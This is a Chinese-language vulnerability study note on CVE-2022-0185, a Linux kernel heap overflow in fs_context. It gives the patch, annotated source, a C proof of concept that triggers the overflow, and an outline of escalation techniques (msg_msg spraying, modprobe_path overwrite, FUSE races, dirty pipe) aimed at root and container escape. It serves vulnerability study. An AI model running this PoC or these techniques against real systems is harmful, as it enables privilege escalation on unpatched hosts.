# CVE-2022-0185 File System Context Integer Overflow


## 影响

Linux-v5.1~v5.16.2。5.1-rc1 引入漏洞，Linux-v5.16.2已修补 ，由syzkaller发现。评分8.4分


内核编译选项

```config
CONFIG_CHECKPOINT_RESTORE=y
CONFIG_USER_NS=y
CONFIG_FUSE_FS=y
CONFIG_SYSVIPC=y
CONFIG_USERFAULTFD=y

CONFIG_E1000=y
CONFIG_E1000E=y
```

## 原理

内核的 File System Context 模块（文件系统环境）的fs/fs_context.c文件中存在整数溢出导致堆溢出。

攻击者须具备 CAP_SYS_ADMIN 权限(允许执行系统管理任务)，或者使用命名空间或者使用unshare(CLONE_NEWNS|CLONE_NEWUSER) （等同于命令$ unshare -Urm: unshare命令是在Linux系统上使用的一个工具，允许创建和管理新的命名空间。）来进入含有CAP_SYS_ADMIN权限的命名空间。

docker中默认没有CAP_SYS_ADMIN权限（启用容器时需使用 `-privileged` 选项），且docker的seccomp过滤会默认拦截 unshare 命令，所以docker中无法利用；但是 Kubernetes 集群在使用docker时，seccomp 过滤默认是禁用的，可以提权和逃逸。

[patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de2)
> The `PAGE_SIZE - 2 - size` calculation in legacy_parse_param() is an
**unsigned type** so a large value of "size" results in a high positive
value instead of a negative value as expected.  Fix this by getting rid
of the subtraction.

diff
```bash
diff --git a/fs/fs_context.c b/fs/fs_context.c
index b7e43a780a625..24ce12f0db32e 100644
--- a/fs/fs_context.c
+++ b/fs/fs_context.c
@@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
 			      param->key);
 	}
 
-	if (len > PAGE_SIZE - 2 - size)
+	if (size + len + 2 > PAGE_SIZE)
 		return invalf(fc, "VFS: Legacy: Cumulative options too large");
 	if (strchr(param->key, ',') ||
 	    (param->type == fs_value_is_string &&
```

### 源码分析

```c
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
    struct legacy_fs_context *ctx = fc->fs_private;
    unsigned int size = ctx->data_size;    // 由后面的更新可以知道，代表向页面中写入过的数据长度 => `,key=value` 字符串长度
    size_t len = 0;

    if (strcmp(param->key, "source") == 0) {
        if (param->type != fs_value_is_string)
            return invalf(fc, "VFS: Legacy: Non-string source");
        if (fc->source)
            return invalf(fc, "VFS: Legacy: Multiple sources");
        fc->source = param->string;
        param->string = NULL;
        return 0;
    }

    if (ctx->param_type == LEGACY_FS_MONOLITHIC_PARAMS)
        return invalf(fc, "VFS: Legacy: Can't mix monolithic and individual options");

    switch (param->type) {          // 计算 1 + key + value
    case fs_value_is_string:
        len = 1 + param->size;
        fallthrough;                // 这里不是 break 
    case fs_value_is_flag:
        len += strlen(param->key);
        break;
    default:
        return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported",
                  param->key);
    }

    if (len > PAGE_SIZE - 2 - size)                     // size 是已经存在内容的长度，通过构造可以溢出，可以使len很大，从而bypass
        return invalf(fc, "VFS: Legacy: Cumulative options too large");
    if (strchr(param->key, ',') ||
        (param->type == fs_value_is_string &&
         memchr(param->string, ',', param->size)))
        return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
                  param->key);
    if (!ctx->legacy_data) {
        ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
        if (!ctx->legacy_data)
            return -ENOMEM;
    }

    ctx->legacy_data[size++] = ',';                     // append，新的内容会追加
    len = strlen(param->key);
    memcpy(ctx->legacy_data + size, param->key, len);   // memcpy key
    size += len;                                        // 更新 size
    if (param->type == fs_value_is_string) {
        ctx->legacy_data[size++] = '=';
        memcpy(ctx->legacy_data + size, param->string, param->size);  // OOB write
        size += param->size;
    }
    ctx->legacy_data[size] = '\0';                     // 截断 0
    ctx->data_size = size;
    ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
    return 0;
}
```

- `PAGE_SIZE-2-size` 结果是一个无符号数，当 size 比较大时会产生溢出（负数转化为无符号数字），导致if判断失误，可以继续执行。使 `memcpy` 时因为 `len` 长度错误，从而导致堆溢出。
- memcpy 不会被 `\x00` 截断，strlen 会截断
- 增加消息形式：`,key=value` 的形式，但是我们传递 key 为 `\x00`，len=0，因此相当于在每次内容前加入了 `,=` 字符串，然后后面为 value 字符串。这也是为什么计算时需要减去2在减去size。

### poc

poc.c: 也需要 `CAP_SYS_ADMIN` 权限才能使用

```c
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void)
{
        char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";  // 33
        int fd = 0;
        fd = fsopen("ext4", 0);
        if (fd < 0) {
                puts("Opening");
                exit(-1);
        }
        for (int i = 0; i < 5000; i++) {
                fsconfig(fd, FSCONFIG_SET_STRING, "\x00", val, 0);
        }
        return 0;
}
```

## 漏洞利用

漏洞利用链
__x64_sys_fsconfig() -> vfs_fsconfig_locked() -> vfs_parse_fs_param() -> legacy_parse_param()

调用 fsconfig 需传入 FSCONFIG_SET_STRING 和两个字符串 key / value
- 填充 key。然后根据 `FSCONFIG_SET_STRING` 调用 vfs_fsconfig_locked 函数，然后调用链形成

`PAGE_SIZE-2-size`  每次传入数据长度为 33 ： (117*(33+2)) == 4095。在第118次就会溢出。
- 最后一次写，会在最后加一个 `\x00`，因此最后一次什么都不写就是溢出 `\x3d\x00` 0x3d是 `=` 的ascii码

```cpp
ctx->legacy_data[size] = '\0';    // 最后赋值
```

### FUSE Hack

[fuse.md](../2-useful-struct/race/fuse.md)

FUSE在qemu中运行
- kenel config需要打开FUSE
- FUSE无法使用其问题主要是文件系统过于残缺导致的，我们可以像`syzkaller`里搞一个 `img` 文件系统，`create_image.sh`, 然后mount创建一个用户，并且安装libfuse。
- busybox 也可以，但是我不会配置

挂载系统，添加用户
```bash
$ sudo mount bullseye.img chroot
$ sudo chroot chroot /bin/bash
root@syzkaller: /# useradd -m ctfer
root@syzkaller: /# passwd ctfer
root@syzkaller: /# exit
$ sudo umount chroot
```

还是拿官方案例的hello举例，在qemu中可以挂载。
<img src="./imgs/qemu_fuse.png" style="zoom:40%"/>

### exploit

几乎没有限制的堆溢出的利用
```bash
$ wget -c https://mirrors.ustc.edu.cn/kernel.org/linux/kernel/v5.x/linux-5.11.11.tar.gz
$ tar -xzf linux-5.11.11.tar.gz
...
$ vim .config
$ make olddefconfig
$ make -j`nproc`
```

验证PoC，如果像使用普通用户进行，需要有 `CAP_ADMIN` 权限
<img src="./imgs/poc.png" style="zoom:40%">

```cpp
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void) {
    char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";  // 33
    int fd = 0;
    unshare(CLONE_NEWNS | CLONE_NEWUSER);
    fd = fsopen("ext4", 0);
    if (fd < 0) {
        puts("Opening");
        exit(-1);
    }
    for (int i = 0; i < 5000; i++) {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", val, 0);
    }
    return 0;
}
```

**注意**： `GFP_KERNEL_COUNT` 这个flag是从 `kmalloc-cg-*` 来分配，而常见的 `GFP_KERNEL` 从 `kmalloc-*` 来分配。这会造成隔离情况
- 5.11.11 msg_msg 使用`GFP_KERNEL_ACCOUNT`分配，legacy_data 使用`GFP_KERNEL`分配
- 但是从内核 5.9 版本开始，引入了新的内存分配接口 kmalloc_node() 和 kzalloc_node()，它们支持针对特定节点的 NUMA 内存分配。此更改使得 `GFP_KERNEL_ACCOUNT` 和 `GFP_KERNEL` 的内存块能够在相同节点上分配，并解决了它们不能共享相同物理内存的限制。

一般来说存储从用户层输入的数据会使用`GFP_KERNEL_ACCOUNT`来分配chunk，这里用`GFP_KERNEL`其实是一个bug。

```cpp
msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);

ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
```

#### change modprobe_path

1. kmalloc 的size为 `PAGE_SIZE (大部分0x1000)`，flags为`GFP_KERNEL` 也是比较大，因此可以使用 msg_msg 结构体。
2. 泄露内核地址，使用 `seq_operation(0x20)` 因此将 msg 大小设置为 0x1000-0x30+0x20+0x8(page_size-msg_msg_head+seq_ops+msg_msgseg_size) = 0xfe8，同时堆喷射大量的 seq_ops。（当然，我们也可以使用其余的结构体）
3. 触发堆溢出，修改 `m_ts` 大小，越界读（seq_file->op），从而泄露函数地址。
4. 条件竞争造成任意地址写(msg_msg unlink)：fuse 稳定竞争
- 分配一个 primary `msg_msg`
- 访问 primary，触发页错误暂停（msgsnd 调用 copy_from_user 发生缺页中断--> fuse + mmap, fuse_read callback 处理）。
- 分配 second `msg_msg`
- 覆盖第primary msg->next，为 modprobe_path。
- 将我们的数据拷贝的next指针地方

snd_msg 先alloc内存，然后copy msg, 然后处理 msgseg。
- 我们让其在第一次copy时挂起，然后使用fsconfig溢出修改next指针，从而进行**任意地址读**

##### Q&A

确实改成功了，但是后面不是 `msg_msg` 结构体,堆布局不对。
<img src="./imgs/fail_spray.png" style="zoom:40%" />


解决办法就是多喷射
<img src="./imgs/spray.png" style="zoom:35%" />

但是msg_msgseg又会出现如下的情况。因此在`send_msg`就在后面打开一个 `seq_file`,可以提高成功率
<img src="./imgs/msg_msgseg.png" style="zoom:35%" />

但是改了 `m_ts` 读取不到内容🤣，没有办法了（抽空在做

使用[这个仓库](https://github.com/bsauce/kernel-exploit-factory)可以成功

#### KCTF

Google KCTF
- 自2020 年以来，Google 运行了一个名为 kCTF 的基于 Kubernetes 的开源 Capture-the-Flag (CTF) 项目，该项目允许研究人员连接到其 Google Kubernetes Engine (GKE) 实例，并尝试破解它们。
- [规则](https://google.github.io/security-research/kernelctf/rules.html)

### dirtypipe

>来自于 veritas501 师傅的博客

1. 不使用竞争，使用 msg_msg leak 堆地址从而进行 uaf 的利用，类似于CVE-2021-22555
2. **结合`dirty pipe`，这样我们就不用绕过那些烦人的保护了**
在kernel >= 5.8中，我们只需修改pipe_buffer中splice页的flag |= PIPE_BUF_FLAG_CAN_MERGE即可（有能力可以顺便把offset和len改成0，这样就能从文件的开头开始写）；在kernel < 5.8中，需要先leak一下pipe_buffer中的anon_pipe_ops，然后将splice页的的ops改为anon_pipe_ops（因为<5.8版本中能否merge是看ops的）（有能力依然可以顺便把offset和len改成0）。

## 参考文章

- [willroot cve-2022-0185](https://www.willsroot.io/2022/01/cve-2022-0185.html)
- [bsauce cve-2022-0185](https://bsauce.github.io/2022/04/08/CVE-2022-0185/)
- [xz cve-2022-0185](https://xz.aliyun.com/t/11031)
- [xi4oyu cve-2022-0185](https://www.xi4oyu.top/4161b49f/)
- [chenaotian cve-2022-0185](https://github.com/chenaotian/CVE-2022-0185)
- [veritas501 cve-2022-0185](https://veritas501.github.io/2022_03_16-CVE_2022_0185%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E4%B8%8Epipe%E6%96%B0%E5%8E%9F%E8%AF%AD%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/)
- [pipe-primitive](https://github.com/veritas501/pipe-primitive)
- [fuse 101](https://exploiter.dev/blog/2022/FUSE-exploit.html)
- [Breeze_CAT](https://blog.csdn.net/Breeze_CAT/article/details/123007818)